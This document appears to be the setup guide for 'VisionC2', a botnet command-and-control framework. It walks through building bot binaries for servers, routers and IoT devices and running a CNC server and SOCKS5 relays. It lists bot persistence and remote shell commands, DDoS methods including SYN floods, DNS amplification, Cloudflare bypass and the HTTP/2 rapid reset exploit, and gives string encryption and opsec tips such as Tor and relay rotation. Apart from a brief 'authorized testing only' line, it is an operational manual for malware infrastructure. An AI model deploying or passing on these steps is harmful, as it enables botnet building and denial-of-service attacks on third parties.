# VisionC2 Setup Guide

> Complete installation and configuration guide. The setup script handles config, encryption, patching, and building automatically.

---

## Prerequisites

### System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **RAM** | 512MB | 2GB+ |
| **Storage** | 1GB | 5GB+ |
| **OS** | Any Linux | Ubuntu 22.04+ / Debian 12+ |
| **Network** | Port 443 open | + Admin port for remote access |

### Install Dependencies

```bash
# Update system and install required packages
sudo apt update && sudo apt install -y openssl git wget gcc python3 screen netcat

# Install Go 1.24+
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
```

**Verify installation:**
```bash
go version  # Should show Go 1.24+
```

---

## Installation

### Clone and Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py   # Select [1] Full Setup
```

### Setup Wizard

The interactive wizard will prompt for:

| Setting | Description | Example |
|---------|-------------|---------|
| **C2 Address** | IP or domain for bot connections | `your-server.com` or `192.168.1.100` |
| **Admin Port** | Port for remote Telnet access | `420` (default) |
| **Relay Endpoints** | SOCKS5 relay servers (optional) | `relay1.com:9001,relay2.com:9001` |
| **SOCKS5 Credentials** | Default proxy authentication | `vision:vision` (default) |
| **TLS Certificate** | SSL certificate details | Country, state, organization, etc. |

### Setup Options

| Option | Purpose | Use Case |
|--------|---------|----------|
| **[1] Full Setup** | New C2 address, new AES key, new tokens, new certs, choose modules, build everything | First-time setup, new campaign |
| **[2] C2 URL Update** | Change C2 address only — keeps existing magic code, certs, and tokens | Server migration, domain change |
| **[3] Module Update & Rebuild** | Enable/disable attacks or SOCKS modules — keeps C2, magic code, and certs, rebuilds bots | Switching between full/atk-only/socks-only |
| **[4] Restore from setup_config.txt** | Re-apply a saved config after `git pull` or fresh clone — generates fresh AES key, re-encrypts blobs, rebuilds all | After `git pull`, restoring an old campaign |

### Generated Files

After setup completion:

```
VisionC2/
├── bins/                  # 14 bot binaries (multi-architecture)
├── cnc/certificates/      # TLS certificates (server.crt, server.key)
├── server                 # CNC server binary
├── relay_server          # SOCKS5 relay server binary
└── setup_config.txt      # Configuration summary
```

---

## Starting the CNC Server

### Launch Options

```bash
./server              # Interactive TUI mode (recommended)
./server --split      # Remote Telnet access mode
```

### Remote Access (Split Mode)

Connect to the Telnet interface:
```bash
nc YOUR_SERVER_IP 420
# Type: spamtec
# Login with credentials
```

### Running in Background

```bash
screen -S vision ./server
# Detach: Ctrl+A, D
# Reattach: screen -r vision
```

**Important:** First run creates a root user with a random password. **Save this password** — it's displayed only once.

---

## SOCKS5 Relay Deployment

Deploy the relay server on a **separate VPS** (not your C2 server):

### Basic Deployment
```bash
./relay_server                # Minimal setup with defaults
```

### Advanced Options
```bash
./relay_server -stats 127.0.0.1:9090              # Enable statistics dashboard
./relay_server -cp 9001 -sp 1080                  # Custom control/SOCKS5 ports
./relay_server -cert server.crt -keyfile server.key  # Custom TLS certificate
```

### Port Configuration

| Port Type | Default | Purpose |
|-----------|---------|---------|
| **Control Port** (`-cp`) | 9001 | Bot backconnect (TLS) |
| **SOCKS5 Port** (`-sp`) | 1080 | Proxy client connections |

> **Detailed relay setup:** See [PROXY.md](PROXY.md)

---

## TUI Interface Guide

### Navigation Controls

| Key | Action |
|-----|--------|
| `↑/↓` or `k/j` | Navigate menus |
| `Enter` | Select item |
| `q` / `Esc` | Back / Cancel |
| `r` | Refresh display |

### Dashboard Views

**Bot Management:**
- **Bot List** — Live bot status with actions (`Enter`=shell, `l`=attack, `p`=persist, `k`=kill)
- **Remote Shell** — Interactive shell to single bot with shortcuts and helpers
- **Broadcast Shell** — Command all bots with filtering options

**Operations:**
- **Launch Attack** — Select method, configure target, launch DDoS
- **Ongoing Attacks** — Monitor active attacks with progress bars
- **SOCKS Manager** — Configure proxy modes (`s`=relay, `d`=direct, `x`=stop)
- **Connection Logs** — Bot connect/disconnect history

---

## Bot Deployment

### Multi-Architecture Support

14 compiled binaries in `bins/` directory covering:
- **x86/x64:** Intel/AMD servers
- **ARM:** Raspberry Pi, mobile, embedded
- **MIPS:** Routers, IoT devices, network appliances
- **PowerPC/RISC-V:** Specialized hardware

### Bot Commands

| Command | Purpose |
|---------|---------|
| `!info` | Display system information |
| `!persist` | Install boot persistence |
| `!reinstall` | Force bot re-download |
| `!kill` | Remove persistence and terminate |

---

## Attack Methods

### Layer 4 (Network)
- `!udpflood` — UDP volume flooding
- `!tcpflood` — TCP connection exhaustion
- `!syn` — SYN flood (raw packets)
- `!ack` — ACK flood (raw packets)
- `!gre` — GRE protocol flooding
- `!dns` — DNS amplification

### Layer 7 (Application)
- `!http` — HTTP request flooding
- `!https` — HTTPS/TLS exhaustion
- `!cfbypass` — Cloudflare bypass
- `!rapidreset` — HTTP/2 CVE-2023-44487 exploit

---

## Configuration Management

### String Encryption

All sensitive strings are encrypted in `bot/config.go` with AES-128-CTR using per-build random keys.

```bash
# Encrypt single string
go run tools/crypto.go encrypt "sensitive_string"

# Encrypt string array
go run tools/crypto.go encrypt-slice "string1" "string2" "string3"

# Decrypt encrypted blob
go run tools/crypto.go decrypt <hex_blob>

# Regenerate all encrypted config
go run tools/crypto.go generate

# Verify config integrity
go run tools/crypto.go verify

# Reset to development state
go run tools/crypto.go resetconfig
```

---

## Troubleshooting

### Common Issues

| Problem | Solution |
|---------|----------|
| **Port 443 denied** | `sudo setcap 'cap_net_bind_service=+ep' ./server` |
| **Bots not connecting** | Check firewall: `ufw allow 443/tcp` |
| **Connection issues** | Test TLS: `openssl s_client -connect HOST:443` |
| **Performance problems** | Run: `sudo bash tools/fix_botkill.sh` |

### Maintenance Commands

| Task | Command |
|------|---------|
| **Rebuild bots only** | `cd tools && ./build.sh` |
| **Remove persistence** | `sudo bash tools/cleanup.sh` |
| **Regenerate TLS certs** | `python3 setup.py` → [1] |
| **Change bot modules** | `python3 setup.py` → [3] |
| **Restore saved config** | `python3 setup.py` → [4] |

### Manual Certificate Generation

```bash
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
```

---

## Security Notes

### Operational Security
- Use separate VPS for relay servers
- Rotate relay infrastructure regularly  
- Monitor connection logs for anomalies
- Use Tor for C2 panel access when possible

### Legal Compliance
- **Authorized testing only** — Obtain written permission before testing any systems
- Document all testing activities
- Follow responsible disclosure for discovered vulnerabilities
- Ensure compliance with local cybersecurity laws

---

## Additional Resources

### Documentation
- **[ARCHITECTURE.md](Docs/ARCHITECTURE.md)** — Technical architecture details
- **[COMMANDS.md](Docs/COMMANDS.md)** — Complete command reference
- **[PROXY.md](Docs/PROXY.md)** — SOCKS5 relay deployment guide
- **[CHANGELOG.md](Docs/CHANGELOG.md)** — Version history and updates

### Support
- Check configuration in `setup_config.txt`
- Review logs for error messages
- Verify network connectivity and firewall rules
- Test with minimal setup before full deployment

---
